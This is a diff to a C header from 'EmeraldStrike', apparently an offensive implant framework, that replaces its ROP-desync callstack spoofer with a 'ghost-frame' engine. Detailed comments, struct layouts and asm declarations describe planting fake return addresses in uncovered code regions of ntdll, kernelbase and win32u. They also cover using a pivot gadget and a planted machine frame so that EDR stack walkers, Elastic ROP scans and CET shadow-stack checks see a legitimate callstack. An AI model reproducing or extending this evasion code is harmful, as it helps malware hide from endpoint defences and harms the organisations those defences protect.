@@ -1,13 +1,39 @@
 /*
-    EmeraldStrike - Desync/SilentMoonwalk Callstack Spoofing
-    Based on SilentMoonwalk by KlezVirus / Waldo-IRC / Trickster0
+    EmeraldStrike - LACUNA Callstack Spoofing
+    Based on LACUNA Chain (0xmaz, 2026) + BYOUD (klezVirus, BHEU 2025).
 
-    ROP-based stack desynchronization: builds fake frames from legitimate
-    .pdata entries, routes calls through gadget chains so the unwound
-    callstack shows KernelBase / WMI / RPC frames instead of the agent.
+    Ghost-frame engine: instead of the deprecated SilentMoonwalk desync
+    (gadget frames caught by Elastic image_rop / RASD gadget scans), fake
+    return addresses are planted at .pdata LACUNAE - executable code in
+    ntdll/kernelbase/win32u with NO RUNTIME_FUNCTION coverage. The unwinder
+    treats each as a leaf (Rip=[Rsp]; Rsp+=8), so a chain of planted ghosts
+    walks as a structurally valid callstack in signed, file-backed modules:
+    passes module-of-origin, CALL-preceded, unwind-metadata and CET
+    shadow-stack-compare checks that kill the desync design.
 
-    All state stored in INSTANCE struct - no .data globals.
-    x64 only. Gated by INCLUDE_EVASION_CALLSTACK_SPOOF.
+    Two primitives, both on a DEDICATED synthetic stack (real parent frames
+    are never modified - the stomping architecture is retired, see
+    references/notes-windows-rework.md for the four-generation failure
+    history):
+      1. ghost_spoof_call (<= 4 register args): target entered with
+         [rsp]=ghost jmp[rbx] gadget (exec restore), shadow space = L1..L4
+         ghosts, MfAnchor + planted machine frame (Rip=0) terminating the
+         walk.
+      2. ghost_spoof_call_args (any arg count, transport-class calls):
+         stack args need [rsp+0x28..], which collides with the chain window,
+         so the chain is relocated above the arg block via a PIVOT gadget:
+         an `add rsp,imm; ret` that is the FINAL instruction of a real
+         .pdata-covered function whose declared frame size == imm (no
+         pushes, no frame register). The target is entered with [rsp]=pivot:
+         execution rets into the pivot, which lands on the ghost gadget and
+         restores; a walker unwinds the pivot's EPILOGUE-offset RIP through
+         its real prolog metadata, so its Rsp jumps imm bytes past the arg
+         block onto the planted [gadget][L1..L4][mf-anchor][machframe] chain
+         and terminates at Rip=0. The chain lives above the last stack arg -
+         where no well-formed callee ever writes - so home-space-spilling
+         Win32 APIs (wininet) are safe on this path, unlike primitive 1.
+
+    All state in INSTANCE. x64 only. Gated by INCLUDE_EVASION_CALLSTACK_SPOOF.
 */
 
 #ifndef EMERALDSTRIKE_CALLSTACK_SPOOF_H
@@ -43,102 +69,111 @@ typedef struct _DS_UNWIND_INFO {
     DS_UNWIND_CODE UnwindCode[1];
 } DS_UNWIND_INFO, *PDS_UNWIND_INFO;
 
-// Register indices for OpInfo
-#define DS_REG_RAX  0
-#define DS_REG_RCX  1
-#define DS_REG_RDX  2
-#define DS_REG_RBX  3
-#define DS_REG_RSP  4
-#define DS_REG_RBP  5
-#define DS_REG_RSI  6
-#define DS_REG_RDI  7
-
-// Unwind opcodes
-#define DS_UWOP_PUSH_NONVOL      0
-#define DS_UWOP_ALLOC_LARGE      1
-#define DS_UWOP_ALLOC_SMALL      2
-#define DS_UWOP_SET_FPREG        3
-#define DS_UWOP_SAVE_NONVOL      4
-#define DS_UWOP_SAVE_NONVOL_BIG  5
-#define DS_UWOP_EPILOG           6
-#define DS_UWOP_SPARE_CODE       7
-#define DS_UWOP_SAVE_XMM128      8
-#define DS_UWOP_SAVE_XMM128BIG   9
+// Unwind opcodes (only PUSH_MACHFRAME matters for the MF-anchor hunt)
 #define DS_UWOP_PUSH_MACH_FRAME  10
 
-// Flags
-#define DS_UNW_FLAG_CHAININFO  0x04
-
-// Gadget byte patterns
-#define DS_JMP_RBX       0x23FF   // ff 23 = jmp [rbx]
-#define DS_RET_BYTE      0xC3
-
-// Minimum ADD RSP immediate
-#define DS_MIN_ADD_RSP_IMM   0x28
-#define DS_PREFERRED_ADD_RSP_IMM  0x58
-
-// ============================================================================
 // Spoof mode constants (must match config.h)
-// ============================================================================
 #define SPOOF_NONE    0
 #define SPOOF_WMI     1
 #define SPOOF_RPC     2
 #define SPOOF_CUSTOM  3
 
 // ============================================================================
-// DESYNC_SPOOFER struct - must match layout in desync_spoof.x64.asm
-// All fields are 8 bytes (QWORD) for alignment
+// Ghost record (discovery output)
 // ============================================================================
 
-typedef struct _DESYNC_SPOOFER {
-    /* Module pointers */
-    PVOID   KernelBaseAddress;              // +0x00
-    PVOID   KernelBaseAddressEnd;           // +0x08
+#define CS_MAX_GHOSTS   128
+// CS_MAX_ARGS: hard cap on spoofed-call arguments (register + stack).
+#define CS_MAX_ARGS     11
 
-    /* Synthetic frame pointers (unused in desync mode, kept for struct layout) */
-    PVOID   RtlUserThreadStartAddress;      // +0x10
-    PVOID   BaseThreadInitThunkAddress;     // +0x18
+typedef struct _CS_GHOST {
+    UINT64  va_start;               // gap start VA (prev EndAddress)
+    UINT64  va_end;                 // gap end VA (next BeginAddress)
+    UINT32  size;
+    const char* name;               // nearest tracked export name (or NULL)
+    UINT32  dist;                   // distance to that export
+} CS_GHOST, *PCS_GHOST;
 
-    /* Frame pointers found during discovery */
-    PVOID   FirstFrameFunctionPointer;      // +0x20
-    PVOID   SecondFrameFunctionPointer;     // +0x28
-    PVOID   JmpRbxGadget;                   // +0x30
-    PVOID   AddRspXGadget;                  // +0x38
+// ============================================================================
+// GHOST_SPOOFER struct - must match layout in ghost_spoof.x64.asm
+// All fields 8-byte aligned.
+// ============================================================================
 
-    /* Frame sizes */
-    UINT64  FirstFrameSize;                 // +0x40
-    UINT64  FirstFrameRandomOffset;         // +0x48
-    UINT64  SecondFrameSize;                // +0x50
-    UINT64  SecondFrameRandomOffset;        // +0x58
-    UINT64  JmpRbxGadgetFrameSize;          // +0x60
-    UINT64  AddRspXGadgetFrameSize;         // +0x68
+typedef struct _GHOST_SPOOFER {
+    /* Module bases */
+    PVOID   NtdllBase;                  // +0x00
+    PVOID   KernelBase;                 // +0x08
+    PVOID   Win32uBase;                 // +0x10 (NULL if not loaded)
 
-    /* Synthetic frame size */
-    UINT64  RtlUserThreadStartFrameSize;    // +0x70
-    UINT64  AddRspImmediate;                // +0x78
+    /* Chain, walked low -> high:
+       GhostGadget is the target's return-address slot: executes as
+       jmp [rbx] (restore), walks as a leaf inside a ghost region.
+       L5ThreadRoot (RtlUserThreadStart+0x21) is kept ONLY for reporting -
+       on ntdll 26100+ its unwind info is a plain ALLOC_SMALL frame and does
+       NOT terminate a walk, so the primitive terminates via MfAnchor and a
+       planted machine frame with Rip=0 instead. */
+    PVOID   GhostGadget;                // +0x18
+    PVOID   L1Ghost;                    // +0x20
+    PVOID   L2Ghost;                    // +0x28 (kernelbase ghost)
+    PVOID   L3Ghost;                    // +0x30 (ntdll ghost)
+    PVOID   L4NopGap;                   // +0x38 (win32u nop gap)
+    PVOID   L5ThreadRoot;               // +0x40 (reporting only)
 
-    /* Offset where RBP is pushed in second frame */
-    UINT64  StackOffsetWhereRbpIsPushed;    // +0x80
+    /* Chain bounds (reporting/diagnostic: full span of discovered chain
+       addresses; the plant/restore VEH guard is retired with the windows) */
+    UINT64  ChainMin;                   // +0x48
+    UINT64  ChainMax;                   // +0x50
 
-    /* Runtime fields */
-    PVOID   JmpRbxGadgetRef;                // +0x88
-    PVOID   SpoofFunctionPointer;           // +0x90
-    PVOID   ReturnAddress;                  // +0x98
+    /* Call API (consumed by ghost_spoof_call asm) */
+    PVOID   Target;                     // +0x58
+    UINT64  Nargs;                      // +0x60
+    PVOID   Arg1;                       // +0x68
+    PVOID   Arg2;                       // +0x70
+    PVOID   Arg3;                       // +0x78
+    PVOID   Arg4;                       // +0x80
+    PVOID   MfAnchor;                    // +0x88 KiUser*Dispatcher+4 (machframe
+                                        // function): unwinding it consumes the
+                                        // planted machine frame and terminates
+                                        // the walk (Rip=0) for ANY walker
 
-    /* Number of arguments + argument values */
-    UINT64  Nargs;                          // +0xA0
-    PVOID   Arg01;                          // +0xA8
-    PVOID   Arg02;                          // +0xB0
-    PVOID   Arg03;                          // +0xB8
-    PVOID   Arg04;                          // +0xC0
-    PVOID   Arg05;                          // +0xC8
-    PVOID   Arg06;                          // +0xD0
-    PVOID   Arg07;                          // +0xD8
-    PVOID   Arg08;                          // +0xE0
-    PVOID   Arg09;                          // +0xE8
-    PVOID   Arg10;                          // +0xF0
-    PVOID   Arg11;                          // +0xF8
-} DESYNC_SPOOFER, *PDESYNC_SPOOFER;
+    /* >4-arg pivot primitive (ghost_spoof_call_args). PivotGadget = the
+       address of a `jmp [rbx]` (FF 23) inside a .pdata-covered function
+       whose UNWIND_INFO parses clean (version 1, no chained info, no
+       frame register) and whose declared frame size is PivotImm >= 0x28.
+       Planted as the target's return address: execution rets into the
+       2-byte jmp and lands on ghost_restore via rbx (the restore-slot
+       pointer, callee-saved); the walker replays the containing
+       function's full prolog from the mid-function RIP and its Rsp
+       jumps PivotImm bytes onto the planted chain. PivotImm caps the
+       supported stack-arg count: Nargs <= 4 + (PivotImm-0x20)/8. */
+    PVOID   PivotGadget;                // +0x90
+    UINT64  PivotImm;                   // +0x98 (containing function frame size)
+    PVOID   StackArgs;                  // +0xA0 asm copies arg5..argN from here
+    PVOID   PivotWindowRsp;             // +0xA8 asm stores the synthetic window
+                                        // base R here before the teleport - the
+                                        // probe dumps the window from it
+    PVOID   PivotCandidate;             // +0xB0 last gadget under calibration
+                                        // (crash-dump diagnostics)
+
+    /* window state: the stomping windows are RETIRED (see file header);
+       bPlanted stays FALSE forever and only gates the probe's
+       RtlCaptureStackBackTrace run (never on a synthetic window). */
+    BOOL    bPlanted;                   // +0xB0
+
+    /* ---- verification probe results (spooftest; asm reads nothing below) ---- */
+    PVOID   ProbeFrames[24];
+    DWORD   ProbeCount;
+    DWORD   ProbeTypes[24];
+    PVOID   ProbeBases[24];
+    UINT64  ProbeRsp;
+    UINT64  ProbeRbp;
+    UINT64  ProbeStack[48];
+    UINT64  LookupEntry;
+    UINT64  LookupBase;
+    UINT64  VUnwindNextRip;
+    UINT64  VUnwindNextRsp;
+    DWORD   WalkFrameChainCount;
+} GHOST_SPOOFER, *PGHOST_SPOOFER;
 
 // ============================================================================
 // API
@@ -146,24 +181,43 @@ typedef struct _DESYNC_SPOOFER {
 
 struct _INSTANCE;
 
-// Initialize the callstack spoofer. Scans KernelBase .pdata for frames and
-// gadgets, optionally overlaying frame sources from WMI/RPC/custom modules.
+// Discover lacunae ghosts across ntdll/kernelbase/win32u, pick the chain,
+// resolve the ghost gadget and thread root. Returns TRUE when at least the
+// stomp path is usable; the call primitive additionally needs GhostGadget.
 BOOL callstack_spoof_init(struct _INSTANCE* inst);
 
-// Refresh random frame offsets for return address variation
-void callstack_spoof_refresh(PDESYNC_SPOOFER pSpoofer, UINT32* pRngState);
+// ASM: perform a ghost-chain spoofed call (<= 4 register args; dispatcher
+// guards this - never call directly with stack arguments).
+extern "C" PVOID ghost_spoof_call(PGHOST_SPOOFER pConfig);
 
-// ASM: perform a spoofed call with desynchronized stack
-extern "C" PVOID desync_spoof_call(PDESYNC_SPOOFER pConfig);
+// ASM: pivot-variant for 5..CS_MAX_ARGS total arguments. Requires
+// PivotGadget/PivotImm/StackArgs to be filled. The dispatcher guards this -
+// never call directly.
+extern "C" PVOID ghost_spoof_call_args(PGHOST_SPOOFER pConfig);
 
-// Compute max safe arg count for a found ADD RSP gadget immediate
-static __inline UINT32 spoof_max_args(UINT64 addRspImm) {
-    if (addRspImm < 0x20) return 4;
-    return (UINT32)(3 + (addRspImm - 0x18) / 8);
-}
+// ASM: calibration setjmp/bail pair (VEH-guarded fault recovery during
+// pivot gadget discovery). cs_calib_set returns 0 normally, 1 when the VEH
+// diverted a fault while it was armed.
+extern "C" UINT64 cs_calib_set(PVOID sav);
+extern "C" VOID   cs_calib_bail(PVOID sav);
 
-// Spoofed dispatch: packs args into the DESYNC_SPOOFER and calls desync_spoof_call
+// Spoofed dispatch: <= 4 args -> ghost_spoof_call; 5..11 -> pivot primitive
+// when the discovered pivot supports the count. Falls back to a plain
+// direct call if not initialized or the primitive is unavailable.
 PVOID callstack_spoofed_call(struct _INSTANCE* inst, PVOID pTarget, DWORD nArgs, ...);
+
+// RETIRED stomp windows: permanent no-ops kept for the transport/sleep call
+// sites still including the shim. The synthetic-stack primitives above are
+// the replacement (see references/notes-windows-rework.md for the failure
+// history that killed frame stomping).
+VOID ghost_chain_plant(struct _INSTANCE* inst);
+VOID ghost_chain_restore(struct _INSTANCE* inst);
+
+// Self-verification: manual RtlCaptureContext + RtlLookupFunctionEntry +
+// RtlVirtualUnwind walk from inside a spoofed call (the primitive EDR
+// walkers use), plus per-chain-address leaf-validation. Results in the
+// Probe* fields.
+BOOL callstack_spoof_verify(struct _INSTANCE* inst, BOOL bSpoofed);
 
 #endif // _WIN64
 #endif // INCLUDE_EVASION_CALLSTACK_SPOOF
